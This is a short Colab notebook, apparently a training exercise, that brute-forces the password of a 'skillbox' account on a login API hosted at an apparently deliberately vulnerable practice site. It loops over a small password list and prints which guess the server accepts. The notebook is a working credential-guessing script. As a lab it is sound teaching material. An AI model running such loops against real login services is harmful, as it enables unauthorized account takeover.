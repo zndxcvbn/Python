{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "collapsed_sections": [],
      "authorship_tag": "ABX9TyOXKix29r0G1+qZodtH923R",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/zndxcvbn/Python/blob/main/Brute_Force.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 4,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 36
        },
        "id": "OS5MkZ5gchE9",
        "outputId": "6dd1f129-3b1f-4f20-f860-87b099b3792a"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'application/json'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 4
        }
      ],
      "source": [
        "# http://vulnerable-app-1.mooo.com/api/login-with-password\n",
        "\n",
        "import requests\n",
        "\n",
        "URL = \"http://vulnerable-app-1.mooo.com/api/login-with-password\"\n",
        "data = { \"login\": \"skillbox\", \"password\": \"1234\" }\n",
        "result = requests.post(URL, data)\n",
        "\n",
        "result.status_code"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Узнать параметр Content-Type\n",
        "result.headers[\"Content-Type\"] "
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 36
        },
        "id": "uQ8D4LI2gHbV",
        "outputId": "cafba4be-c7c1-4a22-ee44-51a6475ff935"
      },
      "execution_count": 6,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'application/json'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 6
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Данные в формате json\n",
        "result.json()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "vfiNLzKrgPWW",
        "outputId": "ab3a4ea2-798d-424d-b3fe-1fdd1829c4a2"
      },
      "execution_count": 8,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "{'result': False}"
            ]
          },
          "metadata": {},
          "execution_count": 8
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from types import resolve_bases\n",
        "# Brute Force\n",
        "password_list = [\n",
        "    \"qwerty\",\n",
        "    \"zxcvbnm\",\n",
        "    \"mike2022\",\n",
        "    \"password1234\",\n",
        "]\n",
        "\n",
        "URL = \"http://vulnerable-app-1.mooo.com/api/login-with-password\"\n",
        "for password in password_list:\n",
        "  data = { \"login\": \"skillbox\", \"password\": password }\n",
        "  result = requests.post(URL, data)\n",
        "  if result.status_code != 200:\n",
        "    print(\"ERROR! Status code\", result.status_code)\n",
        "  json = result.json() # Получаем данные из ответа сервера\n",
        "  auth_result = json[\"result\"] # True подошли данные False не подошли\n",
        "  print(\"Successfull!\", auth_result)\n",
        "print(json)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "MtG2S0EsgfQC",
        "outputId": "15de8cca-12c0-48e4-c00a-fae86d19d595"
      },
      "execution_count": 13,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Successfull! False\n",
            "Successfull! False\n",
            "Successfull! True\n",
            "Successfull! False\n",
            "{'result': False}\n"
          ]
        }
      ]
    }
  ]
}